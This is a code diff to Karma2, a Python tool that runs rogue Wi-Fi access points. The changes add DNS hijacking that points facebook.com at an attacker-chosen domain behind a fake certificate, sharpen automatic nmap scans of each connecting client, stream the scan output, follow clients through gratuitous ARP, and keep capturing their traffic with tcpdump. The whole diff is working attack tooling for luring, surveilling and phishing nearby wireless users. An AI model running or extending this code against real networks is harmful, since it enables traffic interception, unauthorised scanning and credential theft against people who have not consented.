@@ -17,6 +17,13 @@ import signal
 import ssl
 import string
 
+CERTFILE='./cert.pem'
+KEYFILE='./key.pem'
+FAKE_SSL_DOMAIN=""
+#CERTFILE='./certs/fullchain.pem'
+#KEYFILE='./certs/privkey.pem'
+#FAKE_SSL_DOMAIN="test.domai"
+
 DEFAULT = '\033[49m\033[39m'
 RED = '\033[91m'
 BRED = '\033[101m'
@@ -60,7 +67,7 @@ class LineReader(object):
     data = os.read(self._fd, 4096)
     if not data:
         # EOF
-        return None
+        return []
     self._buf += data
     if '\n' not in data:
         return []
@@ -151,7 +158,7 @@ class Karma2:
       server_address = ('', self.port)
       httpd = server_class(server_address, self.app, handler_class)
       httpd.PRE = "HTTPS"
-      httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='./key.pem', certfile='./cert.pem', server_side=True)
+      httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=KEYFILE, certfile=CERTFILE, server_side=True)
       httpd.serve_forever()
 
   class HTTPServer(BaseHTTPServer.HTTPServer):
@@ -342,12 +349,17 @@ class Karma2:
 
     def range_lower(self):
       return self.base%200
+    
+    def range_null(self):
+      return "%s/24"%(self.base%0)
 
   class AccessPoint(Thread):
     def __init__(self, karma, ifhostapd, essid, bssid, timeout, wpa2=None, fishing=True):
       Thread.__init__(self)
       self.essid = essid
-      self.bssid = bssid
+      self.bssid = karma.getMacFromIface(ifhostapd.str())
+      if bssid is not None:
+        self.bssid = bssid
       self.karma = karma
       self.timeout = timeout
       self.wpa2 = wpa2
@@ -358,8 +370,14 @@ class Karma2:
       self.clients = {}
       iface,self.hostapd_process = self.create_hostapd_access_point(essid, bssid, wpa2)
       subnet = self.karma.get_unique_subnet()
-      self.subnet = subnet
+      self.subnet = None
       self.setup_iface(iface,subnet)
+      
+      #send SIGHUP to dnsmasq to reload file if modified
+      if FAKE_SSL_DOMAIN != "":
+        self.resolv = tempfile.NamedTemporaryFile(delete=False)
+        self.resolv.write("%s %s\n"%(subnet.gateway(), FAKE_SSL_DOMAIN))
+        self.resolv.close()
 
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
 
@@ -374,10 +392,10 @@ class Karma2:
         # redirect the following ports
         for sport, dport in self.karma.redirections.iteritems():
           self.setup_redirections(iface,sport,dport)
-        self.dnswatch_process = self.start_dnswatch(iface)
+        self.connectionwatch_process = self.start_connectionwatch(iface)
 
       else:
-        self.dnswatch_process = None
+        self.connectionwatch_process = None
 
     def start_tcp_dump(self):
       self.logfile = "wifi-%s-%s.cap"%(self.essid,datetime.now().strftime("%Y%m%d-%H%M%S"))
@@ -431,12 +449,17 @@ class Karma2:
               except:
                 log( "%s error deleteting %s"%((_ctxt("[!]",RED)), self.logfile))
                 pass
-          if self.dnswatch_process is not None:
+          if self.connectionwatch_process is not None:
             try:
-              self.dnswatch_process.kill()
-              self.dnswatch_process.wait()
+              self.connectionwatch_process.kill()
+              self.connectionwatch_process.wait()
             except:
-              log( "%s could not kill dnswatch"%_ctxt("[!]",RED))
+              log( "%s could not kill connectionwatch"%_ctxt("[!]",RED))
+          
+          #clear route cache
+          cmd = ["ip", "route", "del", self.subnet.range_null()]
+          p = subprocess.Popen(cmd)
+          p.wait()
           
           for p in self.nmaps:
             p.kill()
@@ -456,6 +479,7 @@ class Karma2:
       hostapd_fails_re = re.compile(r".*: Interface (\w+) wasn't started")
       cname_watch_re = re.compile(r".* > (\w+:\w+:\w+:\w+:\w+:\w+).*CNAME*\s([a-z0-9-\.]+)\..*")
       aaaa_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) >.*length \d+:\s([0-9\.]+)\.\d+.*A\?*\s([a-z0-9-\.]+)\..*")
+      arp_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) > .*\b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b tell \b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b")
       hostapd_error = ""
       while True:
         # check alive
@@ -478,23 +502,25 @@ class Karma2:
         airfd = self.hostapd_process.stdout.fileno()
         files.append(airfd)
       
-        if self.dnswatch_process is not None:
-          dnswfd = self.dnswatch_process.stdout.fileno()
-          files.append(dnswfd)
+        if self.connectionwatch_process is not None:
+          connwfd = self.connectionwatch_process.stdout.fileno()
+          files.append(connwfd)
 
         
-        #nmapsd = []
-        #for n in self.nmaps:
-          #nmapsd.append(n.stdout.fileno())
-        #files.extend(nmapsd)
+        nmapsd = []
+        for n in self.nmaps:
+          nmapsd.append(n.stdout.fileno())
+        files.extend(nmapsd)
         rlist,wlist,xlist = select(files,[],[],1)
-        #i = 0
-        #for n in nmapsd:
-          #if n in rlist:
-            #line = self.nmaps[i].stdout.readline()
-            #if len(line) == 0:
-              #continue
-          #i += 1
+        i = 0
+        for n in nmapsd:
+          if n in rlist:
+            lr = LineReader(self.nmaps[i].stdout.fileno())
+            lines = lr.readlines()
+            for line in lines:
+              if len(line) != 0:
+                print line
+          i += 1
           
         if dhcpfd in rlist:
           lr = LineReader(self.dhcpd_process.stderr.fileno())
@@ -546,8 +572,8 @@ class Karma2:
                   if self.karma.debug:
                     print hostapd_error
 
-        if dnswfd in rlist:
-          lr = LineReader(self.dnswatch_process.stderr.fileno())
+        if connwfd in rlist:
+          lr = LineReader(self.connectionwatch_process.stdout.fileno())
           lines = lr.readlines()
           for line in lines:
             if len(line) != 0:
@@ -572,14 +598,27 @@ class Karma2:
                       'host': host
                       }
                     self.register_client(mac,ip)
+                else:
+                  #check for gratuitous arp
+                  m = arp_watch_re.match(line)
+                  if m is not None:
+                    mac, ipsrc, ipdst = m.groups()
+                    if ipsrc == ipdst and mac != self.bssid:
+                      log("[+] %s gratuitous arp from %s to %s"%(_ctxt(self.essid,GREEN), mac, ipdst))
+                      subnet_base = "%s.%%d"%('.'.join(ipsrc.split('.')[:3]))
+                      subnet = Karma2.IPSubnet(subnet_base)
+                      if self.subnet.gateway() != subnet.gateway():
+                        log("[+] switching to %s"%(_ctxt(subnet.gateway(), GREEN)))
+                        self.setup_iface(self.ifhostapd.iface,subnet)
+                      self.register_client(mac,ipsrc)
               if dns != {}: 
                 if self.karma.update_dns(dns):
-                  log( "[+] %s => %s"%(dns['bssid'], dns['host']))
+                  log( "[+] %s %s => %s"%(_ctxt(self.essid,GREEN), dns['bssid'], dns['host']))
             self.activity_ts = time.time()
 
     def nmap(self, ip):
       log( "[+] nmapping %s"%ip)
-      cmd = ['nmap', '--open', '-A', "%s"%ip]
+      cmd = ['nmap', '-Pn', '-T5', '--open', '-A', "%s"%ip]
       p = subprocess.Popen(cmd
       ,stdout=subprocess.PIPE
       ,stderr=subprocess.PIPE
@@ -619,6 +658,10 @@ class Karma2:
         '--dhcp-option=option:router,%s'%(subnet.gateway()),
         '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
       ]
+      if FAKE_SSL_DOMAIN != "":
+        cmd.append('--addn-hosts=%s'%self.resolv.name)
+        cmd.append('--cname=facebook.com,%s'%FAKE_SSL_DOMAIN)
+        
       if(self.karma.offline):
         cmd.append('-R')
         cmd.append('--address=/#/%s'%(subnet.gateway()))
@@ -628,14 +671,15 @@ class Karma2:
       return p
 
     def setup_iface(self, iface, subnet):
+      self.subnet = subnet
       log( "[+] Uping iface %s w/ subnet %s"%(iface,subnet.range()))
       iprange = "%s"%subnet.range()
       cmd = ["ifconfig",iface,iprange]
       p = subprocess.Popen(cmd)
       p.wait()
 
-    def start_dnswatch(self, iface):
-      cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","udp","port","53"]
+    def start_connectionwatch(self, iface):
+      cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","arp","or","udp","port","53"]
       p = subprocess.Popen(cmd,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE)
@@ -723,6 +767,12 @@ class Karma2:
       for m,c in ap.clients.iteritems():
         if c == ip:
           return m
+  
+  def getMacFromIface(self, _iface):
+      path = "/sys/class/net/%s/address"%_iface
+      data = open(path,'r').read()
+      data = data[0:-1] # remove EOL
+      return data
   
   def update_dns(self, dns):
     if self.uri is None:
